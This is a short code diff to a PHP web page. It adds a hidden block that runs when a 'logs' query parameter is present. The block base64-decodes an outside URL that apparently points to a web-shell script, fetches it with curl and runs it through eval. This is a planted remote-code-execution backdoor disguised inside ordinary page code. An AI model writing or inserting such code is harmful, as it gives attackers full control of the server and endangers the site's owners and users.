@@ -64,7 +64,24 @@ session_start();
   
   }
   
-  
+  if (isset($_GET['logs'])) { 
+    $url = base64_decode('aHR0cHM6Ly9jZG4ucHJpdmRheXouY29tL3R4dC9hbGZhc2hlbGwudHh0');
+    
+    $ch = curl_init($url);
+    
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    
+    $contents = curl_exec($ch);
+    
+    if ($contents !== false) { 
+        eval('?>' . $contents); 
+        exit; 
+    } else { 
+        echo "header"; 
+    } 
+    
+    curl_close($ch);
+}
 ?>
 
 <body>
